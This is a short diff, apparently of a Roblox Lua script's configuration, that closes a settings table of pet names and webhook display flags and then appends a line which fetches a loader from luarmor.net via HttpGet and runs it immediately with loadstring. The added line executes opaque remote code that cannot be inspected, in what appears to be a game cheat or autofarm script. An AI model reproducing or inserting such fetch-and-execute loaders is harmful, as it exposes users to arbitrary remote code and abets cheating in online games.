@@ -49,3 +49,5 @@ EQUIP_PETS = { "Seal" , ["Sunny-Side Chicken"] = 1, "French Fry Ferret", "Gorill
     SHOW_WEBHOOK_USERNAME = true,
     SHOW_WEBHOOK_JOBID = true,
 }
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6cb882027ef5de19462b160764dcfb53.lua"))()
